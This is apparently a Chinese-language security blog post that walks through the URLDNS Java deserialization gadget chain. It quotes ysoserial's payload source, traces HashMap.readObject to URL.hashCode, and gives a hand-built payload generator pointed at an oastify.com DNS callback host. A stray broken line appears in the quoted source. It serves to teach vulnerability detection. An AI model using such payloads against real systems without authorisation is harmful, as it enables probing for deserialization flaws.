---
layout: mypost
title: Java反序列化URLDNS链分析
categories: [Javasec]
extMath: true
---

# URLDNS链

## 示例

加载一个`DNSlog`链接

![image.png](image.png)

使用[**`ysoserial`](https://github.com/frohoff/ysoserial) 的图形化工具[`Deswing`](https://github.com/0ofo/Deswing)生成.bin文件**

启动命令：

`java --add-opens java.base/java.net=ALL-UNNAMED  -jar deswing.jar`

![image.png](image%201.png)

写一段反序列化代码,这里就用之前写的

```java
import java.io.*;

public class Ser {
    public static void serializable (String path, Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(path));
        oos.writeObject(obj);
    }
    public static Object unserializable (String path) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
        return ois.readObject();
    }
    public static void main(String[] args) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("urldns1.bin"));
        Object obj = objectInputStream.readObject();
    }
}
```

![image.png](image%202.png)

运行后：

![image.png](image%203.png)

## 分析

URLDNS代码如下：

```java
package me.gv7.woodpecker.yso.payloads;
me.gv7.woodpecker.yso.

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/**
 * 关于这个漏洞利用链（gadget chain），有一篇包含更多详细信息的博客文章，网址如下：
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 * 此思路的灵感来自 Philippe Arteau（@h3xstream），他曾撰写博客文章，描述了自己如何修改 ysoserial 中的 Java Commons Collections 利用链来打开一个 URL。
 * 这个实现采用了相同的思路，但去除了对 Commons Collections 的依赖，仅使用标准 JDK 类来执行 DNS 查找。
 *
 * Java 的 URL 类在其 equals 和 hashCode 方法上有一个有趣的特性。在进行比较（无论是 equals 还是 hashCode 操作）时，URL 类会产生一个副作用，即执行 DNS 查找。
 *
 * 作为反序列化过程的一部分，HashMap 会对其反序列化的每个键调用 hashCode 方法，因此使用 Java URL 对象作为已序列化的键，就能够触发 DNS 查找。
 *
 * 漏洞利用链（Gadget Chain）流程：
 *     HashMap.readObject()
 *       ↓
 *       HashMap.putVal()
 *         ↓
 *         HashMap.hash()
 *           ↓
 *           URL.hashCode()
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

    /**
     * 生成可触发 DNS 查找的反序列化利用对象
     * @param url 要触发 DNS 查找的目标 URL 字符串
     * @return 包含特殊构造 URL 作为键的 HashMap 对象，用于后续反序列化触发 DNS 查找
     * @throws Exception 执行过程中可能抛出的异常（如反射操作异常、IO 异常等）
     */
    public Object getObject(final String url) throws Exception {

        // 在创建 payload 期间避免 DNS 解析
        // 因为 java.net.URL.handler 字段是 transient（瞬时）的，它不会成为序列化后 payload 的一部分
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // 用于存放 URL 的 HashMap
        URL u = new URL(null, url, handler); // 用作键的 URL 对象
        ht.put(u, url); // 值可以是任何可序列化的内容，这里用 URL 作为键就是为了触发 DNS 查找

        // 在之前的 put 操作中，URL 的 hashCode 已计算并缓存，重置后下次调用 hashCode 时会再次触发 DNS 查找
        Reflections.setFieldValue(u, "hashCode", -1); 

        return ht;
    }

    public static void main(final String[] args) throws Exception {
        // 调用 PayloadRunner 来运行测试该 payload，传入当前类和命令行参数
        PayloadRunner.run(URLDNS.class, args);
    }

    /**
     * <p>这个 URLStreamHandler 的实例用于在创建 URL 实例时避免任何 DNS 解析。DNS 解析是用于漏洞检测的。
     * 在使用序列化对象之前，不要去探测给定的 URL，这一点很重要。</p>
     *
     * <b>潜在的假阴性情况：</b>
     * <p>如果 DNS 名称先从测试人员的计算机解析，目标服务器在第二次解析时可能会命中缓存（导致无法正常检测到漏洞）。</p>
     */
    static class SilentURLStreamHandler extends URLStreamHandler {

        /**
         * 重写打开连接的方法，直接返回 null，避免实际建立连接和触发 DNS 解析
         * @param u 要打开连接的 URL 对象
         * @return 返回 null，不进行实际的连接操作
         * @throws IOException 抛出 IO 异常（实际这里重写后一般不会真正抛出，只是遵循方法签名）
         */
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        /**
         * 重写获取主机地址的方法，直接返回 null，避免触发 DNS 解析来获取主机地址
         * @param u 要获取主机地址的 URL 对象
         * @return 返回 null，不进行实际的 DNS 解析获取主机地址操作
         */
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
```

调用链已经标注了：

```java
HashMap.readObject()
 *       ↓
 *       HashMap.putVal()
 *         ↓
 *         HashMap.hash()
 *           ↓
 *           URL.hashCode()
```

### HashMap

调用链从`HashMap.readObject()` 开始，看一下

![image.png](image%204.png)

主要在截屏的这一段，因为`HashMap`中的键和值都是对象，所以要反序列化一个`map`就要恢复里面的键和值

其中这里会计算`key`的`hash`

`HashMap.hash()` 

![image.png](image%205.png)

就是`key`不为空的话就会调用反序列化对象的`hashCode()`，下面看一下`URL`的`hashCode()`

### URL.hashCode()

先看URL.hashCode()

![image.png](image%206.png)

`hashler.hashCode()`

![image.png](image%207.png)

显然是在保证`hashCode`等于`-1`时调用`hashler.hashCode()`达到目的

可以看到确实是在这里获取`ip`是发了请求

## 手动实现

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

/*
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
         *
         */

public class Ser {
    public static void serializable (String path, Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(path));
        oos.writeObject(obj);
    }
    public static Object unserializable (String path) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
        return ois.readObject();
    }
    public static void main(String[] args) throws Exception {
//        URL url = new URL("https://mkap9q531y6b02jqyhedgyt9l0rrfh36.oastify.com");
//        Field hashCode = URL.class.getDeclaredField("hashCode");
//        hashCode.setAccessible(true);
//        hashCode.setInt(url,666);
//        HashMap <URL,Object> map = new HashMap<>();
//        map.put(url,null);
//        hashCode.setInt(url,-1);
//        serializable("urldns3.bin",map);
        unserializable("urldns3.bin");
    }
}
```

上面代码里面还有一行需要说明是

`hashCode.setInt(url,666);` 

这里为什么一开始不让`hashCode=-1`，是因为往`map`里面放的时候也会计算`hash`

![image.png](image%208.png)

如果不这样那生成`.bin`文件时就会发起`DNS`请求

![URLDNS.png](URLDNS.png)